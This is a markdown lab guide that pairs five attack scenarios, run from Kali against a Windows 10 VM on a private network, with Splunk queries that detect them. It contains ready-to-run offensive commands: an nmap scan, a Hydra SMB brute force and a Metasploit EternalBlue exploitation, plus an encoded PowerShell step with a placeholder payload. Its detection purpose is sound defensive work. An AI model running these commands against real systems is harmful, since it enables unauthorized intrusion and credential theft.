# Attack Scenarios & Detection Guide

> All attacks performed on Windows 10 VM (192.168.9.2) from Kali Linux (192.168.9.1)

---

## Scenario 1 — Nmap Port Scan

### Attack (Kali Linux):
```bash
nmap -sS 192.168.9.2
```

### Detection (Splunk):
```spl
index=main EventCode=3
| stats dc(DestinationPort) as ports_scanned by SourceIp
| where ports_scanned > 20
```

---

## Scenario 2 — Brute Force Login (Hydra)

### Attack (Kali Linux):
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.9.2
```

### Detection (Splunk):
```spl
index=main EventCode=4625
| stats count by TargetUserName IpAddress
| where count > 10
| sort -count
```

---

## Scenario 3 — Metasploit Exploitation

### Attack (Kali Linux):
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.9.2
run
```

### Detection (Splunk):
```spl
index=main EventCode=1
| search Image="*cmd.exe*" OR Image="*powershell.exe*"
| table _time Image CommandLine ParentImage

index=main EventCode=3
| stats count by SourceIp DestinationIp DestinationPort
| sort -count
```

---

## Scenario 4 — PowerShell Execution

### Attack (Kali Linux via Meterpreter):
```
shell
powershell -enc <base64 payload>
```

### Detection (Splunk):
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational"
| table _time ScriptBlockText

index=main EventCode=1 Image="*powershell.exe*"
| table _time CommandLine ParentImage
```

---

## Scenario 5 — Persistence via Registry

### Detection (Splunk):
```spl
index=main EventCode=13
| search TargetObject="*Run*" OR TargetObject="*RunOnce*"
| table _time Image TargetObject Details
```
